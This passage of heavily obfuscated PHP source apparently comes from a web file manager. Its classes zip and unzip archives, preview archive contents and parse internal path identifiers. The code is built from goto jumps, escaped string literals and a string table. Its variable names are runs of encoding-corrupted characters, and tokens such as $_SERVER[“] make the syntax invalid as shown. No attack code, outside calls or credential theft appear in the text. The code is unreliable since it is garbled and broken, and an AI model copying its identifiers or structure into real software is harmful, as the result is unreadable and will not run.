(isset($E­êÆ‹É¡¡[$fÌìšŸÙĞ¢[6]][$fÌìšŸÙĞ¢[1011]])) { $aÎÓèàöéœ->pathBase = rtrim($E­êÆ‹É¡¡[$fÌìšŸÙĞ¢[6]][$fÌìšŸÙĞ¢[1011]], $fÌìšŸÙĞ¢[8]) . $fÌìšŸÙĞ¢[8]; $cèìæ†¬Ïš = $aÎÓèàöéœ->pathBase . ltrim($cèìæ†¬Ïš, $fÌìšŸÙĞ¢[8]); } $cèìæ†¬Ïš = $aÎÓèàöéœ->getPath($cèìæ†¬Ïš); if (isset($eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[985]])) { $cèìæ†¬Ïš = $eİÇ¤”šÅ£[$fÌìšŸÙĞ¢[985]]; } goto EŒ‹‚äƒ•; díİ»ğ¯¨Ø: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $b÷Öä„ßÜ—; if (!$b÷Öä„ßÜ—) { $bÍÏ»ÊµÁó = IO::init($_SERVER[“][8]); } return $bÍÏ»ÊµÁó; } private static function iconvSystem($d¡Ğóß®©) { return self::local()->iconvSystem($d¡Ğóß®©); } private static function iconvApp($B”ó¼Ç‡­×) { return self::local()->iconvApp($B”ó¼Ç‡­×); } public static function zip($F¼‰¸éÅŠİ, $b‹¥ƒÏÈ½½ = "\x7a\151\160", $cãİ¹–÷Æç = '', $CíĞÖŒçºê = REPEAT_RENAME) { goto Aªº¤àÚºï; F•õÏ›ÊÄ: $B†µ¿‰‰… = $bøÇğµã© . $BëÊãÄ…Ô¸ . $e¬½‰ğ©Ü[91] . $b‹¥ƒÏÈ½½; $B†µ¿‰‰… = get_filename_auto($B†µ¿‰‰…, $e¬½‰ğ©Ü[33], $CíĞÖŒçºê); $D‰ÑÏçæö = self::iconvSystem($B†µ¿‰‰…); goto dÁ¶“óÖÖÆ; eÒô‚ˆäñ¿: $d·‘ãßïƒ = !1; if (!$cãİ¹–÷Æç && $bÎõ¿‡->getType() == $e¬½‰ğ©Ü[102]) { $aÔ ¿ææßÈ = self::zipFileList($F¼‰¸éÅŠİ); } else { $d·‘ãßïƒ = $cãİ¹–÷Æç ? $cãİ¹–÷Æç : TEMP_FILES . $e¬½‰ğ©Ü[1012] . time() . rand_string(8) . $e¬½‰ğ©Ü[8]; mk_dir($d·‘ãßïƒ); $aÔ ¿ææßÈ = self::zipFileList($F¼‰¸éÅŠİ, $d·‘ãßïƒ); } $BëÊãÄ…Ô¸ = $FÃˆæğ‘¹„[$e¬½‰ğ©Ü[28]]; goto a‰åÓ°”ºñ; Aªº¤àÚºï: $e¬½‰ğ©Ü =& $_SERVER[“]; $bÎõ¿‡ = self::init($F¼‰¸éÅŠİ[0][$e¬½‰ğ©Ü[75]]); $FÃˆæğ‘¹„ = self::info($F¼‰¸éÅŠİ[0][$e¬½‰ğ©Ü[75]]); goto eÒô‚ˆäñ¿; B¡¤—äÆ¥¹: if (!$A‡·ñ‰‹‹ï) { del_dir($d·‘ãßïƒ); show_json(LNG($e¬½‰ğ©Ü[1014]), !1); } del_dir($d·‘ãßïƒ); return $A‡·ñ‰‹‹ï; goto fÎ¦¤†Üøè; a‰åÓ°”ºñ: if (count($aÔ ¿ææßÈ) > 1) { $D©•µ®¦ = IO::info(IO::pathFather($FÃˆæğ‘¹„[$e¬½‰ğ©Ü[75]])); $BëÊãÄ…Ô¸ = $D©•µ®¦[$e¬½‰ğ©Ü[28]]; } $bøÇğµã© = $d·‘ãßïƒ; if (!$bøÇğµã©) { $bøÇğµã© = get_path_father($FÃˆæğ‘¹„[$e¬½‰ğ©Ü[75]]); $bœåØï†ïå = IO::info($bøÇğµã©); if (!$bœåØï†ïå[$e¬½‰ğ©Ü[189]]) { show_json(LNG($e¬½‰ğ©Ü[1013]), !1); } } goto F•õÏ›ÊÄ; dÁ¶“óÖÖÆ: foreach ($aÔ ¿ææßÈ as $dâ­Ûø‹¦Ë => $eÒÌ”±—) { $aÔ ¿ææßÈ[$dâ­Ûø‹¦Ë] = self::iconvSystem($eÒÌ”±—); } KodArchive::create($D‰ÑÏçæö, $aÔ ¿ææßÈ); if (!IO::exist($B†µ¿‰‰…)) { if ($d·‘ãßïƒ) { del_dir($d·‘ãßïƒ); } show_json(LNG($e¬½‰ğ©Ü[1014]), !1); } goto AÔêÎš‹ó†; AÔêÎš‹ó†: if ($cãİ¹–÷Æç || !$d·‘ãßïƒ) { if ($d·‘ãßïƒ && strstr($d·‘ãßïƒ, TEMP_FILES)) { $E£¯áŠÈä÷ = $aÔ ¿ææßÈ = array(); recursion_dir($bøÇğµã©, $E£¯áŠÈä÷, $aÔ ¿ææßÈ, 0); foreach ($E£¯áŠÈä÷ as $b‘ÔâŞ¼¢) { del_dir($b‘ÔâŞ¼¢); } foreach ($aÔ ¿ææßÈ as $dà‘‹í»ª) { if ($dà‘‹í»ª == $D‰ÑÏçæö) { continue; } del_file($dà‘‹í»ª); } } return $B†µ¿‰‰…; } $BÉéÄöáÉ = self::pathFather($FÃˆæğ‘¹„[$e¬½‰ğ©Ü[75]]); $A‡·ñ‰‹‹ï = self::move($B†µ¿‰‰…, $BÉéÄöáÉ, $CíĞÖŒçºê); goto B¡¤—äÆ¥¹; fÎ¦¤†Üøè: } public static function unzip($a•˜”ˆ„³œ, $f‰¸ÊêÄ¨Î = "\162\145\x70\154\141\x63\x65") { goto c‰ÑÎÑ¬ìº; D­ Ç•ŠŠ¦: $e‡¶¼Ş¹‹ = self::tmpFileName($AŠÛé¦Ë’); $bİ…™¼¤ = TEMP_FILES . $e‡¶¼Ş¹‹; del_dir($bİ…™¼¤); goto E„İ±­ˆà; BÒÏéƒêõÄ: Hook::trigger($DôÔ±™äì°[1022], $bİ…™¼¤); recursion_dir($bİ…™¼¤, $F™Ã‡³ã†Ó, $cØ¡íÑ·É, 0); $DÎ¶Ùè’ÈÆ = array_merge($F™Ã‡³ã†Ó, $cØ¡íÑ·É); goto B·ªŸ›ÀĞ; E„İ±­ˆà: mk_dir($bİ…™¼¤); $Fğ÷ùî‡„ = self::fileExt($AŠÛé¦Ë’); $D”Œò‘¥–± = $bİ…™¼¤ . $DôÔ±™äì°[91] . $Fğ÷ùî‡„; goto D™ëĞ …£­; D™ëĞ …£­: if (!@file_exists(self::iconvSystem($D”Œò‘¥–±))) { $FÉİÙÓ‡“Ú = self::localFilePath($BÎ­¿×²¥ø, $Fğ÷ùî‡„); $D”Œò‘¥–± = $FÉİÙÓ‡“Ú ? $FÉİÙÓ‡“Ú : parent::download($BÎ­¿×²¥ø, $D”Œò‘¥–±); } $D”Œò‘¥–± = self::iconvSystem($D”Œò‘¥–±); $CÓÑÖ”ø× = isset($a•˜”ˆ„³œ[$DôÔ±™äì°[1017]]) ? $a•˜”ˆ„³œ[$DôÔ±™äì°[1017]] : $DôÔ±™äì°[1018]; goto eµí—º‹›; D’ÄŞµŒ’: if (!($AŠÛé¦Ë’ = parent::info($BÎ­¿×²¥ø))) { show_json(LNG($DôÔ±™äì°[1016]), !1); } if (!($AÅ§òöÊŠæ = parent::infoFull($aÄ«ğ—ÁøÆ))) { $aÄ«ğ—ÁøÆ = parent::mkdir($aÄ«ğ—ÁøÆ); $AÅ§òöÊŠæ = array($DôÔ±™äì°[75] => $aÄ«ğ—ÁøÆ); } else { if (isset($AÅ§òöÊŠæ[$DôÔ±™äì°[369]]) && trim($AÅ§òöÊŠæ[$DôÔ±™äì°[75]], $DôÔ±™äì°[8]) != trim($aÄ«ğ—ÁøÆ, $DôÔ±™äì°[8])) { $D¹¤¹ã×ğ  = KodIO::make($AÅ§òöÊŠæ[$DôÔ±™äì°[463]]); $eºë¦’÷‹ = parent::fileNameAuto($D¹¤¹ã×ğ , $AÅ§òöÊŠæ[$DôÔ±™äì°[28]], REPEAT_RENAME_FOLDER, !0); $aÄ«ğ—ÁøÆ = parent::mkdir($D¹¤¹ã×ğ  . $eºë¦’÷‹); $AÅ§òöÊŠæ = array($DôÔ±™äì°[75] => $aÄ«ğ—ÁøÆ); } } $aÄ«ğ—ÁøÆ = $AÅ§òöÊŠæ[$DôÔ±™äì°[75]]; goto D­ Ç•ŠŠ¦; B·ªŸ›ÀĞ: foreach ($DÎ¶Ùè’ÈÆ as $dĞŠÛŠ…ÖÍ) { $dĞŠÛŠ…ÖÍ = self::iconvApp($dĞŠÛŠ…ÖÍ); self::move($dĞŠÛŠ…ÖÍ, $aÄ«ğ—ÁøÆ, $f‰¸ÊêÄ¨Î); } del_dir($bİ…™¼¤); if (!$FÉİÙÓ‡“Ú) { del_file($D”Œò‘¥–±); } goto a™…º¬™´; eµí—º‹›: $bòóµ‚˜«„ = KodArchive::extract($D”Œò‘¥–±, $bİ…™¼¤ . $DôÔ±™äì°[8], $CÓÑÖ”ø×); self::archiveExt(); if (!$bòóµ‚˜«„[$DôÔ±™äì°[1019]]) { show_json($DôÔ±™äì°[1020] . $bòóµ‚˜«„[$DôÔ±™äì°[1021]], !1); } goto BÒÏéƒêõÄ; a™…º¬™´: return !0; goto DëßÔÓ; c‰ÑÎÑ¬ìº: $DôÔ±™äì° =& $_SERVER[“]; $BÎ­¿×²¥ø = $a•˜”ˆ„³œ[$DôÔ±™äì°[75]]; $aÄ«ğ—ÁøÆ = $a•˜”ˆ„³œ[$DôÔ±™äì°[1015]]; goto D’ÄŞµŒ’; DëßÔÓ: } public static function unzipList($Dƒâ„ÎùÆ) { goto AŒšÎÒ¯öà; e¼ˆ‰è˜¼Û: $aË¼ä……ñ˜ = self::iconvSystem($aË¼ä……ñ˜); if ($f§‹ĞßÑëÙ >= 0) { $Få¼±·»Ï = isset($Dƒâ„ÎùÆ[$EÖæõİ¬ÌŒ[1027]]) ? $Dƒâ„ÎùÆ[$EÖæõİ¬ÌŒ[1027]] : !1; $bŠ¯‘ÏÈ™Ğ = isset($Dƒâ„ÎùÆ[$EÖæõİ¬ÌŒ[28]]) ? $Dƒâ„ÎùÆ[$EÖæõİ¬ÌŒ[28]] : $EÖæõİ¬ÌŒ[33]; KodArchive::filePreview($aË¼ä……ñ˜, $f§‹ĞßÑëÙ, $Få¼±·»Ï, $bŠ¯‘ÏÈ™Ğ); self::archiveExt(); die; } $FõÆø÷×”Ì = KodArchive::listContent($aË¼ä……ñ˜); goto C†Ø¬Ò±æË; dÌíÆ‚–ƒ: if (isset($E­Û¬˜‰Ÿ)) { $fè¡Ô‹Ñ‚ = array($E­Û¬˜‰Ÿ[$EÖæõİ¬ÌŒ[75]], $E­Û¬˜‰Ÿ[$EÖæõİ¬ÌŒ[1023]], $E­Û¬˜‰Ÿ[$EÖæõİ¬ÌŒ[28]]); $aá‚£Ô¤½š = md5(implode($EÖæõİ¬ÌŒ[70], $fè¡Ô‹Ñ‚)) . $EÖæõİ¬ÌŒ[91] . get_path_ext($E­Û¬˜‰Ÿ[$EÖæõİ¬ÌŒ[28]]); } else { $fè¡Ô‹Ñ‚ = array($C¸§Æ´‰¼Ø[$EÖæõİ¬ÌŒ[28]], $C¸§Æ´‰¼Ø[$EÖæõİ¬ÌŒ[75]], $C¸§Æ´‰¼Ø[$EÖæõİ¬ÌŒ[77]]); $aá‚£Ô¤½š = md5(implode($EÖæõİ¬ÌŒ[70], $fè¡Ô‹Ñ‚)) . $EÖæõİ¬ÌŒ[91] . $e†å¼–’‘¬; } if ($f§‹ĞßÑëÙ == -1) { $c±¾×„É‹ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\x69\x65\167\57{$e´ºğ´¡‰Œ}\57{$aá‚£Ô¤½š}\x2e\x6c\x6f\x67"; $bñ½»äŸÖ = self::infoFull($c±¾×„É‹); if ($bñ½»äŸÖ) { $c±¾×„É‹ = $bñ½»äŸÖ[$EÖæõİ¬ÌŒ[75]]; $b”ƒĞ‰ ™ = self::getContent($c±¾×„É‹); if ($b”ƒĞ‰ ™) { $c¦ğËêî¦‚ = json_decode($b”ƒĞ‰ ™, !0); if (count($c¦ğËêî¦‚) >= $aæãÓÂ—‰ ) { show_json(sprintf(LNG($EÖæõİ¬ÌŒ[1025]), count($c¦ğËêî¦‚)), !1); } return $c¦ğËêî¦‚; } } else { $c±¾×„É‹ = self::mkfile($c±¾×„É‹); } } $bã±ííò­ = TEMP_FILES . $e´ºğ´¡‰Œ; goto bòÎÁ—¹¦œ; DèˆÉ·Äøò: return $FõÆø÷×”Ì[$EÖæõİ¬ÌŒ[1021]]; goto EÔ±„¯†•; C†Ø¬Ò±æË: self::archiveExt(); del_dir($bã±ííò­); if (!$FõÆø÷×”Ì[$EÖæõİ¬ÌŒ[1019]]) { show_json($FõÆø÷×”Ì[$EÖæõİ¬ÌŒ[1021]], !1); } goto f¯”’˜Ìä‰; F¼Ø¬£×Ó: $C¸§Æ´‰¼Ø = self::info($CˆÀ›î±¯); $e†å¼–’‘¬ = self::fileExt($C¸§Æ´‰¼Ø); $e´ºğ´¡‰Œ = self::tmpFileName($C¸§Æ´‰¼Ø); goto dÌíÆ‚–ƒ; bòÎÁ—¹¦œ: if (!is_dir($bã±ííò­)) { mk_dir($bã±ííò­); } $aË¼ä……ñ˜ = $bã±ííò­ . $EÖæõİ¬ÌŒ[8] . $aá‚£Ô¤½š; if (!@file_exists(self::iconvSystem($aË¼ä……ñ˜))) { if (isset($E­Û¬˜‰Ÿ)) { url_request($F¿‚‚íéÖÓ, $EÖæõİ¬ÌŒ[1026], $aË¼ä……ñ˜); } else { $Dá’Ú™‚‚ = self::localFilePath($F¿‚‚íéÖÓ, $e†å¼–’‘¬); $aË¼ä……ñ˜ = $Dá’Ú™‚‚ ? $Dá’Ú™‚‚ : self::download($F¿‚‚íéÖÓ, $aË¼ä……ñ˜); } } goto e¼ˆ‰è˜¼Û; Aã¥µ«†±: $aæãÓÂ—‰  = 50000; if (request_url_safe($F¿‚‚íéÖÓ)) { $E­Û¬˜‰Ÿ = parse_url_query($F¿‚‚íéÖÓ); if (!isset($E­Û¬˜‰Ÿ[$EÖæõİ¬ÌŒ[75]])) { show_json($EÖæõİ¬ÌŒ[1024], !1); } } $CˆÀ›î±¯ = isset($E­Û¬˜‰Ÿ) ? $E­Û¬˜‰Ÿ[$EÖæõİ¬ÌŒ[75]] : $F¿‚‚íéÖÓ; goto F¼Ø¬£×Ó; AŒšÎÒ¯öà: $EÖæõİ¬ÌŒ =& $_SERVER[“]; $F¿‚‚íéÖÓ = $Dƒâ„ÎùÆ[$EÖæõİ¬ÌŒ[75]]; $f§‹ĞßÑëÙ = isset($Dƒâ„ÎùÆ[$EÖæõİ¬ÌŒ[1023]]) ? $Dƒâ„ÎùÆ[$EÖæõİ¬ÌŒ[1023]] : -1; goto Aã¥µ«†±; f¯”’˜Ìä‰: $c¦ğËêî¦‚ = json_encode($FõÆø÷×”Ì[$EÖæõİ¬ÌŒ[1021]]); self::setContent($c±¾×„É‹, $c¦ğËêî¦‚); if (count($FõÆø÷×”Ì[$EÖæõİ¬ÌŒ[1021]]) >= $aæãÓÂ—‰ ) { show_json(sprintf(LNG($EÖæõİ¬ÌŒ[1025]), count($FõÆø÷×”Ì[$EÖæõİ¬ÌŒ[1021]])), !1); } goto DèˆÉ·Äøò; EÔ±„¯†•: } private static function fileExt($CŠİÊª¾˜Ô) { $d¦‚³®®³ç =& $_SERVER[“]; $dé‚µŠ†ÑÀ = $CŠİÊª¾˜Ô[$d¦‚³®®³ç[160]]; if ($dé‚µŠ†ÑÀ == $d¦‚³®®³ç[1028]) { $DŠ”£òóœ = $d¦‚³®®³ç[1029]; if (substr($CŠİÊª¾˜Ô[$d¦‚³®®³ç[28]], -strlen($DŠ”£òóœ)) == $DŠ”£òóœ) { $dé‚µŠ†ÑÀ = $d¦‚³®®³ç[1030]; } } self::archiveExt($dé‚µŠ†ÑÀ); return $dé‚µŠ†ÑÀ; } private static function zipFileList($Aö¨½”­‚›, $bæ§³¯¥á¤ = false) { $Eà”µÁ‹†é =& $_SERVER[“]; $C†›†”º±Ì = array(); foreach ($Aö¨½”­‚› as $Eîº´æ·”) { $aËí‹¼…ôÌ = $Eîº´æ·”[$Eà”µÁ‹†é[75]]; if ($bæ§³¯¥á¤) { $aËí‹¼…ôÌ = self::copy($Eîº´æ·”[$Eà”µÁ‹†é[75]], $bæ§³¯¥á¤, $Eà”µÁ‹†é[728]); } if ($aËí‹¼…ôÌ && self::local()->exist($aËí‹¼…ôÌ)) { $C†›†”º±Ì[$Eîº´æ·”[$Eà”µÁ‹†é[75]]] = $aËí‹¼…ôÌ; } } if (!empty($C†›†”º±Ì)) { return array_values($C†›†”º±Ì); } show_json(LNG($Eà”µÁ‹†é[1031]), !1); } public static function tmpFileName($BÖ¢İµÓÇ´) { $E½ëÄŸ®Ò• =& $_SERVER[“]; $Eİë´¼Ú–„ = array($BÖ¢İµÓÇ´[$E½ëÄŸ®Ò•[28]], $BÖ¢İµÓÇ´[$E½ëÄŸ®Ò•[75]], $BÖ¢İµÓÇ´[$E½ëÄŸ®Ò•[77]], $BÖ¢İµÓÇ´[$E½ëÄŸ®Ò•[461]]); return md5(implode($E½ëÄŸ®Ò•[70], $Eİë´¼Ú–„)); } private static function localFilePath($Cªãù·ÇŠÓ, $b¦Ü†Ç¸”‚) { goto BªÒ¹¥Ÿªñ; cˆùˆÎŠ¢: if ($f‹»ºÚ³Ô == $aŞ’ôõ¹øÌ[102] || $f‹»ºÚ³Ô == $aŞ’ôõ¹øÌ[1035]) { if (!$Dõ½‰Ú­ç->exist($Dõ½‰Ú­ç->path)) { show_json(LNG($aŞ’ôõ¹øÌ[101]), !1); } return $Dõ½‰Ú­ç->path; } return !1; goto BåœÏ­âîƒ; BªÒ¹¥Ÿªñ: $aŞ’ôõ¹øÌ =& $_SERVER[“]; if ($b¦Ü†Ç¸”‚ == $aŞ’ôõ¹øÌ[1032] && strtoupper(substr(PHP_OS, 0, 3)) == $aŞ’ôõ¹øÌ[1033]) { return !1; } $d£Ëá¥˜ˆñ = KodIO::parse($Cªãù·ÇŠÓ); goto f²ßÙºÛÄ; f²ßÙºÛÄ: if ($d£Ëá¥˜ˆñ[$aŞ’ôõ¹øÌ[29]] == KodIO::KOD_SOURCE) { $Dˆ‡ğÍ¸ö× = Model($aŞ’ôõ¹øÌ[736])->fileInfoGet(KodIO::sourceID($Cªãù·ÇŠÓ)); if (!$Dˆ‡ğÍ¸ö×[$aŞ’ôõ¹øÌ[75]]) { show_json($aŞ’ôõ¹øÌ[1034], !1); } $Cªãù·ÇŠÓ = $Dˆ‡ğÍ¸ö×[$aŞ’ôõ¹øÌ[75]]; } $Dõ½‰Ú­ç = self::init($Cªãù·ÇŠÓ); $f‹»ºÚ³Ô = $Dõ½‰Ú­ç->getType(); goto cˆùˆÎŠ¢; BåœÏ­âîƒ: } private static function archiveExt($BÏÜæö’ãØ = '') { $GLOBALS[$_SERVER[“][1036]] = $BÏÜæö’ãØ; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\162\122\x65\143\x79\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\163\145\162\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\x72\x46\x69\154\145\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\162\x46\x69\154\145\124\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\165\160\122\x6f\157\x74\123\145\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\162\123\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\x72\123\x68\x61\x72\145\x4c\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\162\145\124\157\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\150\141\162\145\111\x74\145\155\175"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\145\111\164\x65\155\114\151\156\x6b\x7d"; const KOD_SEARCH = "\173\163\145\x61\x72\x63\x68\175"; const KOD_BLOCK = "\173\142\154\x6f\143\153\x7d"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\162\122\145\x6e\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\x64\162\x69\x76\x65\x72\x7d"; public static function typeList() { $d´ßÕ°Ü› =& $_SERVER[“]; return array($d´ßÕ°Ü›[1037] => self::KOD_SOURCE, $d´ßÕ°Ü›[1038] => self::KOD_USER_RECYCLE, $d´ßÕ°Ü›[1039] => self::KOD_USER_FAV, $d´ßÕ°Ü›[1040] => self::KOD_USER_FILE_TAG, $d´ßÕ°Ü›[1041] => self::KOD_USER_FILE_TYPE, $d´ßÕ°Ü›[1042] => self::KOD_GROUP_ROOT_SELF, $d´ßÕ°Ü›[1043] => self::KOD_USER_SHARE, $d´ßÕ°Ü›[1044] => self::KOD_USER_SHARE_LINK, $d´ßÕ°Ü›[1045] => self::KOD_USER_SHARE_TO_ME, $d´ßÕ°Ü›[1046] => self::KOD_SHARE_ITEM, $d´ßÕ°Ü›[1047] => self::KOD_SHARE_LINK, $d´ßÕ°Ü›[1048] => self::KOD_SEARCH, $d´ßÕ°Ü›[1049] => self::KOD_BLOCK, $d´ßÕ°Ü›[1050] => self::KOD_IO, $d´ßÕ°Ü›[1051] => self::KOD_USER_RECENT, $d´ßÕ°Ü›[1052] => self::KOD_USER_DRIVER); } public static function parse($eÓÙÏ”Ö‚ˆ) { goto F˜Åƒ¡İ‰; e½ŒñÜŸÔ: preg_match($b…Ï’¹ó”[1053], $eÓÙÏ”Ö‚ˆ, $FªÛĞ¼‹¨‘); $E‰æÑâË‹ä = array($b…Ï’¹ó”[388] => !1, $b…Ï’¹ó”[1054] => !1, $b…Ï’¹ó”[385] => !1, $b…Ï’¹ó”[75] => $eÓÙÏ”Ö‚ˆ, $b…Ï’¹ó”[1000] => !1, $b…Ï’¹ó”[999] => $b…Ï’¹ó”[33]); if (is_array($FªÛĞ¼‹¨‘) && count($FªÛĞ¼‹¨‘) == 5) { $d«øªíÎã† = $b…Ï’¹ó”[1055] . $FªÛĞ¼‹¨‘[2] . $b…Ï’¹ó”[315]; if (in_array($d«øªíÎã†, $dó“¼¯Ÿ£)) { $E‰æÑâË‹ä[$b…Ï’¹ó”[1000]] = $FªÛĞ¼‹¨‘[1]; $E‰æÑâË‹ä[$b…Ï’¹ó”[29]] = $d«øªíÎã†; $E‰æÑâË‹ä[$b…Ï’¹ó”[1056]] = substr($d«øªíÎã†, 1, -1); $E‰æÑâË‹ä[$b…Ï’¹ó”[367]] = $FªÛĞ¼‹¨‘[3]; } $E‰æÑâË‹ä[$b…Ï’¹ó”[999]] = $FªÛĞ¼‹¨‘[4]; } goto Cö“Ê™Ùèí; Cö“Ê™Ùèí: $E‹ÀÌ”‹£Û = array($b…Ï’¹ó”[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $E‰æÑâË‹ä[$b…Ï’¹ó”[1057]] = in_array($E‰æÑâË‹ä[$b…Ï’¹ó”[29]], $E‹ÀÌ”‹£Û); return $E‰æÑâË‹ä; goto A‡˜ÅÛ; F˜Åƒ¡İ‰: $b…Ï’¹ó” =& $_SERVER[“]; $eÓÙÏ”Ö‚ˆ = self::clear($eÓÙÏ”Ö‚ˆ); $dó“¼¯Ÿ£ = array_values(self::typeList()); goto e½ŒñÜŸÔ; A‡˜ÅÛ: } public static function clear($bİéÜÈâŞÂ) { goto eÇö ø»—; eÇö ø»—: $DÛÃ­ƒñß… =& $_SERVER[“]; $bİéÜÈâŞÂ = str_replace(array($DÛÃ­ƒñß…[979], $DÛÃ­ƒñß…[217]), $DÛÃ­ƒñß…[50], $bİéÜÈâŞÂ); $bİéÜÈâŞÂ = str_replace($DÛÃ­ƒñß…[93], $DÛÃ­ƒñß…[8], $bİéÜÈâŞÂ); goto DòŸƒ©¶êá; FÏ¬‚°¾Çô: return $bİéÜÈâŞÂ; goto a¥ÄİµöÀí; DòŸƒ©¶êá: $dÌö™äÁ¤ = $DÛÃ­ƒñß…[1058]; if (substr($bİéÜÈâŞÂ, 0, 3) == $DÛÃ­ƒñß…[1059]) { $bİéÜÈâŞÂ = substr($bİéÜÈâŞÂ, 3); } while (strstr($bİéÜÈâŞÂ, $dÌö™äÁ¤)) { $bİéÜÈâŞÂ = str_replace($dÌö™äÁ¤, $DÛÃ­ƒñß…[8], $bİéÜÈâŞÂ); } goto f‘Ÿå‰á„; f‘Ÿå‰á„: $bİéÜÈâŞÂ = preg_replace($DÛÃ­ƒñß…[1060], $DÛÃ­ƒñß…[8], $bİéÜÈâŞÂ); if ($bİéÜÈâŞÂ == $DÛÃ­ƒñß…[8]) { return $DÛÃ­ƒñß…[8]; } $bİéÜÈâŞÂ = rtrim($bİéÜÈâŞÂ, $DÛÃ­ƒñß…[8]); goto FÏ¬‚°¾Çô; a¥ÄİµöÀí: } public static function sourceID($eÒ„áÂÆ³¿) { $dõä†‡¥Ø =& $_SERVER[“]; $DÇÌ×½Ÿ„ = self::parse($eÒ„áÂÆ³¿); if ($DÇÌ×½Ÿ„[$dõä†‡¥Ø[29]] !== self::KOD_SOURCE) { show_json(LNG($dõä†‡¥Ø[1061]), !1); } return $DÇÌ×½Ÿ„[$dõä†‡¥Ø[367]]; } public static function make($B˜ìï¿–ª) { if (!$B˜ìï¿–ª) { return !1; } return self::makePath(self::KOD_SOURCE, intval($B˜ìï¿–ª)); } public static function makeShare($cËĞ˜¬Çƒ×, $Aâ©óæ½À) { return self::makePath(self::KOD_SHARE_ITEM, $cËĞ˜¬Çƒ×, $Aâ©óæ½À); } public static function makeFileTypePath($a“¤Ñ•¹„º) { return self::makePath(self::KOD_USER_FILE_TYPE, $a“¤Ñ•¹„º); } public static function makeFileTagPath($E½İŞÊÊäç) { return self::makePath(self::KOD_USER_FILE_TAG, $E½İŞÊÊäç); } public static function makePath($C—ä½…©è, $eÜÀ“§åçµ = '', $aÊøé¦¡ÉÀ = '') { $f³‡½×—“â =& $_SERVER[“]; $C–™ÖÓïÊ = substr($C—ä½…©è, 1, -1); $eƒ·«÷ã‰­ = $f³‡½×—“â[1062] . $C–™ÖÓïÊ . $f³‡½×—“â[1063] . $eÜÀ“§åçµ . $f³‡½×—“â[1064]; $eƒ·«÷ã‰­ = $aÊøé¦¡ÉÀ ? $eƒ·«÷ã‰­ . $aÊøé¦¡ÉÀ . $f³‡½×—“â[8] : $eƒ·«÷ã‰­; return $eƒ·«÷ã‰­; } public static function hashPath($eƒ†Š—Â‘‡) { $d¸¬¤ÏÅŸ¥ =& $_SERVER[“]; $A´ë´…‰„ = is_array($eƒ†Š—Â‘‡) ? $eƒ†Š—Â‘‡ : IO::info($eƒ†Š—Â‘‡); $E³öİâØ°¢ = _get($A´ë´…‰„, $d¸¬¤ÏÅŸ¥[1065], $d¸¬¤ÏÅŸ¥[33]); if (!$E³öİâØ°¢) { $CŠ´·ÊŒæÜ = KodIO::parse($A´ë´…‰„[$d¸¬¤ÏÅŸ¥[75]]); if (!$CŠ´·ÊŒæÜ[$d¸¬¤ÏÅŸ¥[29]]) { $E³öİâØ°¢ = IO::hashSimple($A´ë´…‰„[$d¸¬¤ÏÅŸ¥[75]]); } } if (!$E³öİâØ°¢) { $E³öİâØ°¢ = md5($A´ë´…‰„[$d¸¬¤ÏÅŸ¥[75]] . $A´ë´…‰„[$d¸¬¤ÏÅŸ¥[77]] . $A´ë´…‰„[$d¸¬¤ÏÅŸ¥[107]]); } return $E³öİâØ°¢; } public static function initSystemPath() { $D«ï·µºÉß =& $_SERVER[“]; if (defined($D«ï·µºÉß[1066])) { return; } define($D«ï·µºÉß[1066], self::systemPath($D«ï·µºÉß[1067])); define($D«ï·µºÉß[1068], self::systemPath($D«ï·µºÉß[1069])); define($D«ï·µºÉß[1070], self::systemPath($D«ï·µºÉß[1071])); define($D«ï·µºÉß[1072], self::systemPath($D«ï·µºÉß[1073])); } private static function systemPath($Cõ“ëÛ˜šÂ) { goto CØå§«õØå; b¹­İ¨»¿Š: if ($C²³™×˜±í) { return $C²³™×˜±í; } if ($Cõ“ëÛ˜šÂ == $b¯‹Ò“†—Œ[1067]) { $C²³™×˜±í = self::make(Model($b¯‹Ò“†—Œ[736])->systemRootPathAdd($b¯‹Ò“†—Œ[1076])); } else { $C²³™×˜±í = self::systemPath($b¯‹Ò“†—Œ[1067]); $FÌç›¦Èôã = self::sourceID($C²³™×˜±í); $C²³™×˜±í = self::make(Model($b¯‹Ò“†—Œ[736])->mkdir($FÌç›¦Èôã, $Cõ“ëÛ˜šÂ)); } Model($b¯‹Ò“†—Œ[1075])->set($A×Ìî†, $C²³™×˜±í); goto EÊïÅœíÅÇ; CØå§«õØå: $b¯‹Ò“†—Œ =& $_SERVER[“]; $A×Ìî† = $b¯‹Ò“†—Œ[1074] . ucfirst($Cõ“ëÛ˜šÂ); $C²³™×˜±í = Model($b¯‹Ò“†—Œ[1075])->get($A×Ìî†); goto b¹­İ¨»¿Š; EÊïÅœíÅÇ: return $C²³™×˜±í; goto Eë·‡™»Ï; Eë·‡™»Ï: } public static function systemFolder($D÷Öë®ëí) { $a¹½Ô´ß = IO_PATH_SYSTEM_SOURCE . $D÷Öë®ëí; $føÙ´ã¨—õ = Cache::get($a¹½Ô´ß); if (!$føÙ´ã¨—õ) { $d÷¤Î¶İ— = IO::infoFull($a¹½Ô´ß); if (!$d÷¤Î¶İ—) { $føÙ´ã¨—õ = IO::mkdir($a¹½Ô´ß, REPEAT_SKIP); } else { $føÙ´ã¨—õ = $d÷¤Î¶İ—[$_SERVER[“][75]]; } Cache::set($a¹½Ô´ß, $føÙ´ã¨—õ, 3600 * 10); } return 